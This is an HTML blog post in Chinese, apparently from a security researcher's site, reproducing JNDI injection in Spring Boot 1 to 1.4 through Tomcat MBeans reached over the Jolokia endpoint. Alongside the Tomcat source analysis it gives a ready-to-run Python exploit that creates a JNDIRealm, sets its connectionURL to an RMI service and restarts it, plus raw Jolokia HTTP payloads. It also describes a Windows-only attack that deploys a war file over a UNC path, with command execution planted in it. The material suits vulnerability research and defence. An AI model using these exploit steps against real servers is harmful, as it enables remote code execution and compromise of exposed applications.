@@ -1,0 +1,466 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="Spring Boot Tomcat导致的JNDI注入一、漏洞简介二、漏洞影响Spring Boot 1 - 1.4 三、复现过程漏洞分析spring Boot 内嵌了一个 Tomcat，所以在 MBean 列表中列出了 Tomcat 的MBean。通过漫长的寻找（花了我两三天的晚上），找到了几个比较有意思的且感觉可以利用的MBean operation。   Tomcat:type&#x3D;MBeanF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/Spring%20Boot/Spring%20Boot%20Tomcat%E5%AF%BC%E8%87%B4%E7%9A%84JNDI%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:description" content="Spring Boot Tomcat导致的JNDI注入一、漏洞简介二、漏洞影响Spring Boot 1 - 1.4 三、复现过程漏洞分析spring Boot 内嵌了一个 Tomcat，所以在 MBean 列表中列出了 Tomcat 的MBean。通过漫长的寻找（花了我两三天的晚上），找到了几个比较有意思的且感觉可以利用的MBean operation。   Tomcat:type&#x3D;MBeanF">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-07-08T06:26:03.803Z">
+<meta property="article:modified_time" content="2021-04-21T01:23:46.000Z">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-Spring Boot/Spring Boot Tomcat导致的JNDI注入" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Spring%20Boot/Spring%20Boot%20Tomcat%E5%AF%BC%E8%87%B4%E7%9A%84JNDI%E6%B3%A8%E5%85%A5/" class="article-date">
+  <time datetime="2022-07-08T06:26:03.803Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Spring-Boot-Tomcat导致的JNDI注入"><a href="#Spring-Boot-Tomcat导致的JNDI注入" class="headerlink" title="Spring Boot Tomcat导致的JNDI注入"></a>Spring Boot Tomcat导致的JNDI注入</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Spring Boot 1 - 1.4</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>spring Boot 内嵌了一个 Tomcat，所以在 MBean 列表中列出了 Tomcat 的<br>MBean。通过漫长的寻找（花了我两三天的晚上），找到了几个比较有意思的且感觉可以利用的<br>MBean operation。</p>
+<ol>
+<li> Tomcat:type=MBeanFactory createJNDIRealm -&gt; JNDI Injection</li>
+<li> Tomcat:type=MBeanFactory createJDBCRealm -&gt; JNDI Injection</li>
+<li> Tomcat:type=MBeanFactory createDataSourceRealm -&gt; JNDI Injection</li>
+<li> Tomcat:type=MBeanFactory createUserDatabaseRealm -&gt; JNDI Injection</li>
+<li>Tomcat:type=MBeanFactory createValve -&gt; Create Valve (File<br> Writting, JNDI Injection)</li>
+</ol>
+<p>这里举一个 createUserDatabaseRealm 的例子：</p>
+<pre><code>  FILE: tomcat-embed-core-8.5.15-sources.jar!\org\apache\catalina\mbeans\MBeanFactory.java
+   public String createUserDatabaseRealm(String parent, String resourceName)
+       throws Exception &#123;
+
+        // Create a new UserDatabaseRealm instance
+       UserDatabaseRealm realm = new UserDatabaseRealm();
+       realm.setResourceName(resourceName);
+       
+       // Add the new instance to its parent component
+       ObjectName pname = new ObjectName(parent);
+       Container container = getParentContainerFromParent(pname);
+       // Add the new instance to its parent component
+       container.setRealm(realm);
+       // Return the corresponding MBean name
+       ObjectName oname = realm.getObjectName();
+       // FIXME getObjectName() returns null
+       //ObjectName oname =
+       //    MBeanUtils.createObjectName(pname.getDomain(), realm);
+       if (oname != null) &#123;
+           return (oname.toString());
+       &#125; else &#123;
+           return null;
+       &#125;
+
+   &#125;
+</code></pre>
+<p>调用 setter 把 resourceName 写入。接着在 start Realm<br>的时候，会调用以下函数：</p>
+<p>FILE: tomcat-embed-core\8.5.15-embed-core-8.5.15-sources.jar!.java</p>
+<pre><code>   @Override
+   protected void startInternal() throws LifecycleException &#123;
+
+       try &#123;
+           Context context = getServer().getGlobalNamingContext();
+           database = (UserDatabase) context.lookup(resourceName);
+       &#125; catch (Throwable e) &#123;
+           ExceptionUtils.handleThrowable(e);
+           containerLog.error(sm.getString(&quot;userDatabaseRealm.lookup&quot;,
+                                           resourceName),
+                              e);
+           database = null;
+       &#125;
+       if (database == null) &#123;
+           throw new LifecycleException
+               (sm.getString(&quot;userDatabaseRealm.noDatabase&quot;, resourceName));
+       &#125;
+       
+       super.startInternal();
+
+   &#125;
+</code></pre>
+<p>是不是非常熟悉的场景？<code>context.lookup(resourceName)</code>，而 resourceName<br>可控，那么可以直接JNDI<br>注入了。但是遗憾的是<code>getServer().getGlobalNamingContext()</code> 返回的是<br>null，所以在lookup的时候抛了 NullPointer 的错误。还有一些奇奇怪怪的<br>Bug，比如利用 createValve 创建一个JDBCAccessLogValve，但是利用 Jolokia<br>设置其 driverName 的时候，由于 driverName 没有getter，导致 Jolokia<br>不能正常设置；再比如 createJDBCRealm<br>的时候，由于这个方法接受的参数和MBean<br>导出（mbeans-descriptors.xml）的配置文件内写的参数数量不一致导致无法调用这个<br>MBean operation。</p>
+<h4 id="createJNDIRealm"><a href="#createJNDIRealm" class="headerlink" title="createJNDIRealm"></a>createJNDIRealm</h4><p>在多次尝试后，最终我盯上了 createJNDIRealm 这个方法。</p>
+<p>FILE: tomcat-embed-core-8.5.15-sources.jar!.java</p>
+<pre><code>public String createJNDIRealm(String parent)
+    throws Exception &#123;
+
+     // Create a new JNDIRealm instance
+    JNDIRealm realm = new JNDIRealm();
+
+    // Add the new instance to its parent component
+    ObjectName pname = new ObjectName(parent);
+    Container container = getParentContainerFromParent(pname);
+    // Add the new instance to its parent component
+    container.setRealm(realm);
+    // Return the corresponding MBean name
+    ObjectName oname = realm.getObjectName();
+
+    if (oname != null) &#123;
+        return (oname.toString());
+    &#125; else &#123;
+        return null;
+    &#125;
+&#125;
+</code></pre>
+<p>这里只传入了 parent。利用 Burpsuite 先创建这个 Realm。</p>
+<pre><code>POST /jolokia/ HTTP/1.1
+Host: localhost
+Content-Type: application/json
+Content-Length: 133
+&#123;
+    &quot;type&quot;: &quot;EXEC&quot;,
+    &quot;mbean&quot;: &quot;Tomcat:type=MBeanFactory&quot;,
+    &quot;operation&quot;: &quot;createJNDIRealm&quot;,
+    &quot;arguments&quot;: [&quot;Tomcat:type=Engine&quot;]
+&#125;
+</code></pre>
+<p>创建成功后，我们查看这个 Realm 的 MBean 信息：</p>
+<pre><code>realmPath=/realm0,type=Realm: &#123;
+    op: &#123;...&#125;,
+    attr: &#123;
+        userPassword: &#123;&#125;,
+        ...
+        connectionURL: &#123;
+            rw: true,
+            type: &quot;java.lang.String&quot;,
+            desc: &quot;The connection URL for the server we will contact&quot;
+        &#125;,
+        roleNested: &#123;&#125;,
+        userSearch: &#123;&#125;,
+        connectionTimeout: &#123;&#125;,
+        authentication: &#123;&#125;,
+        contextFactory: &#123;
+            rw: true,
+            type: &quot;java.lang.String&quot;,
+            desc: &quot;The JNDI context factory for this Realm&quot;
+        &#125;,
+        userPattern: &#123;&#125;,
+        ...
+    &#125;,
+    class: &quot;org.apache.tomcat.util.modeler.BaseModelMBean&quot;,
+    desc: &quot;Implementation of Realm that works with a directory server a...&quot;
+&#125;
+</code></pre>
+<p>注意到两个有意思的属性，connectionURL 和 contextFactory。查看 JNDIRealm<br>的源码：</p>
+<pre><code>FILE: 
+
+   protected Hashtable&lt;String, String&gt; getDirectoryContextEnvironment() &#123;
+        Hashtable&lt;String, String&gt; env = new Hashtable();
+        if (this.containerLog.isDebugEnabled() &amp;&amp; this.connectionAttempt == 0) &#123;
+            this.containerLog.debug(&quot;Connecting to URL &quot; + this.connectionURL);
+        &#125; else if (this.containerLog.isDebugEnabled() &amp;&amp; this.connectionAttempt &gt; 0) &#123;
+            this.containerLog.debug(&quot;Connecting to URL &quot; + this.alternateURL);
+        &#125;
+        env.put(&quot;java.naming.factory.initial&quot;, this.contextFactory);
+    if (this.connectionName != null) &#123;
+        env.put(&quot;java.naming.security.principal&quot;, this.connectionName);
+    &#125;
+
+    if (this.connectionPassword != null) &#123;
+        env.put(&quot;java.naming.security.credentials&quot;, this.connectionPassword);
+    &#125;
+    
+    if (this.connectionURL != null &amp;&amp; this.connectionAttempt == 0) &#123;
+        env.put(&quot;java.naming.provider.url&quot;, this.connectionURL);
+    &#125; else if (this.alternateURL != null &amp;&amp; this.connectionAttempt &gt; 0) &#123;
+        env.put(&quot;java.naming.provider.url&quot;, this.alternateURL);
+    &#125;
+    
+    ...
+    
+    return env;
+&#125;
+
+private DirContext createDirContext(Hashtable&lt;String, String&gt; env) throws NamingException &#123;
+    return (DirContext)(this.useStartTls ? this.createTlsDirContext(env) : new InitialDirContext(env));
+&#125;
+</code></pre>
+<p>可见 java.naming.factory.initial 和 java.naming.provider.url<br>我们都可以通过 MBean 来进行修改，接着在 createDirContext<br>方法，利用刚才的 env 创建了 InitialDirContext 对象。最终可以造成JNDI<br>注入。于是我满怀欣喜的搭建好 RMI Service，却发现爆了这么一个错误：</p>
+<pre><code>javax.naming.ConfigurationException: The object factory is untrusted. Set the system property &#39;com.sun.jndi.rmi.object.trustURLCodebase&#39; to &#39;true&#39;.
+    at com.sun.jndi.rmi.registry.RegistryContext.decodeObject(RegistryContext.java:495) ~[na:1.8.0_121]
+    at com.sun.jndi.rmi.registry.RegistryContext.lookup(RegistryContext.java:138) ~[na:1.8.0_121]
+    at com.sun.jndi.toolkit.url.GenericURLContext.lookup(GenericURLContext.java:205) ~[na:1.8.0_121]
+    at com.sun.jndi.url.rmi.rmiURLContextFactory.getUsingURL(rmiURLContextFactory.java:71) ~[na:1.8.0_121]
+    at com.sun.jndi.url.rmi.rmiURLContextFactory.getObjectInstance(rmiURLContextFactory.java:56) ~[na:1.8.0_121]
+    at com.sun.jndi.rmi.registry.RegistryContextFactory.URLToContext(RegistryContextFactory.java:102) ~[na:1.8.0_121]
+    at com.sun.jndi.rmi.registry.RegistryContextFactory.getInitialContext(RegistryContextFactory.java:69) ~[na:1.8.0_121]
+    ...
+</code></pre>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>由于 Spring Boot 内嵌了 Tomcat 和 Tomcat EL，可以直接使用文章中的<br>Exploit。最终 Exploit 触发分为五个步骤。</p>
+<p>a.  创建 JNDIRealm<br>b.  写入 connectionURL 为你的 RMI Service URL<br>c.  写入 contextFactory 为 RegistryContextFactory<br>d.  停止 Realm<br>e.  启动 Realm 以触发 JNDI 注入</p>
+<p>最终 Exploit 如下：</p>
+<pre><code> import requests, sys, time, pprint
+
+ url = sys.argv[1]
+
+ create_realm = &#123;
+     &quot;mbean&quot;: &quot;Tomcat:type=MBeanFactory&quot;,
+     &quot;type&quot;: &quot;EXEC&quot;,
+     &quot;operation&quot;: &quot;createJNDIRealm&quot;,
+     &quot;arguments&quot;: [&quot;Tomcat:type=Engine&quot;]
+ &#125;
+
+ wirte_factory = &#123;
+     &quot;mbean&quot;: &quot;Tomcat:realmPath=/realm0,type=Realm&quot;,
+     &quot;type&quot;: &quot;WRITE&quot;,
+     &quot;attribute&quot;: &quot;contextFactory&quot;,
+     &quot;value&quot;: &quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;
+ &#125;
+
+ write_url = &#123;
+     &quot;mbean&quot;: &quot;Tomcat:realmPath=/realm0,type=Realm&quot;,
+     &quot;type&quot;: &quot;WRITE&quot;,
+     &quot;attribute&quot;: &quot;connectionURL&quot;,
+     &quot;value&quot;: &quot;rmi://localhost:1097/Object&quot;
+ &#125;
+
+ stop = &#123;
+     &quot;mbean&quot;: &quot;Tomcat:realmPath=/realm0,type=Realm&quot;,
+     &quot;type&quot;: &quot;EXEC&quot;,
+     &quot;operation&quot;: &quot;stop&quot;,
+     &quot;arguments&quot;: []
+ &#125;
+
+ start = &#123;
+     &quot;mbean&quot;: &quot;Tomcat:realmPath=/realm0,type=Realm&quot;,
+     &quot;type&quot;: &quot;EXEC&quot;,
+     &quot;operation&quot;: &quot;start&quot;,
+     &quot;arguments&quot;: []
+ &#125;
+
+ flow = [create_realm, wirte_factory, write_url, stop, start]
+
+ for i in flow:
+     print(&#39;%s MBean %s: %s ...&#39; % (i[&#39;type&#39;].title(), i[&#39;mbean&#39;], i.get(&#39;operation&#39;, i.get(&#39;attribute&#39;))))
+     requests.post(url, json=i).json()
+</code></pre>
+<h3 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h3><p><strong>利用UNC部署war文件（只能用于windows）</strong></p>
+<p>在 Tomcat Host Manager 这里可以利用 UNC 来部署 war<br>文件。实际上对于Tomcat:type=MBeanFactory 的createStandardHost，和 Host<br>Manager<br>这里调用的是相同的方法。所以根据文章所述的方法，我们同样可以在Jolokia<br>里重现。不过可惜的是这里只对 Windows 有效。 首先去 spring-boot 的 Github<br>下载 spring-boot-samples-traditional，在 web.xml 里添加如下内容：</p>
+<pre><code>&lt;servlet&gt;
+    &lt;servlet-name&gt;default&lt;/servlet-name&gt;
+    &lt;servlet-class&gt;
+        org.apache.catalina.servlets.DefaultServlet
+    &lt;/servlet-class&gt;
+    &lt;init-param&gt;
+        &lt;param-name&gt;debug&lt;/param-name&gt;
+        &lt;param-value&gt;0&lt;/param-value&gt;
+    &lt;/init-param&gt;
+    &lt;init-param&gt;
+        &lt;param-name&gt;listings&lt;/param-name&gt;
+        &lt;param-value&gt;false&lt;/param-value&gt;
+    &lt;/init-param&gt;
+    &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;
+&lt;/servlet&gt;
+
+&lt;servlet-mapping&gt;
+    &lt;servlet-name&gt;default&lt;/servlet-name&gt;
+    &lt;url-pattern&gt;/default&lt;/url-pattern&gt;
+&lt;/servlet-mapping&gt;
+</code></pre>
+<p>然后修改 WebConfig.java，在 dispatcherServlet 添加执行命令的代码：</p>
+<pre><code>@Bean
+// Only used when running in embedded servlet
+public DispatcherServlet dispatcherServlet() throws Exception &#123;
+    Runtime.getRuntime().exec(&quot;calc&quot;);
+    return new DispatcherServlet();
+&#125;
+</code></pre>
+<p>接着打包成 war 文件放在远程的共享服务器上面，发送如下请求即可：</p>
+<pre><code>POST /jolokia HTTP/1.1
+Host: localhost
+Content-Type: application/json
+Content-Length: 192
+
+&#123;
+    &quot;mbean&quot;: &quot;Tomcat:type=MBeanFactory&quot;,
+    &quot;type&quot;: &quot;EXEC&quot;,
+    &quot;operation&quot;: &quot;createStandardHost&quot;,
+    &quot;arguments&quot;: [&quot;Tomcat:type=Engine&quot;, &quot;test2&quot;, &quot;\\127.0.0.1\test&quot;, true, true, true, true]
+&#125;
+</code></pre>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Spring%20Boot/Spring%20Boot%20Tomcat%E5%AF%BC%E8%87%B4%E7%9A%84JNDI%E6%B3%A8%E5%85%A5/" data-id="cl5c2qvmr00gpy8v11cvg37q8" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/07/07/Spring%20Boot/Spring%20Boot%20whitelabel%20error%20page%20SpEL%20rce/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/07/07/Spring%20Boot/Spring%20Boot%20Thymeleaf%20%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
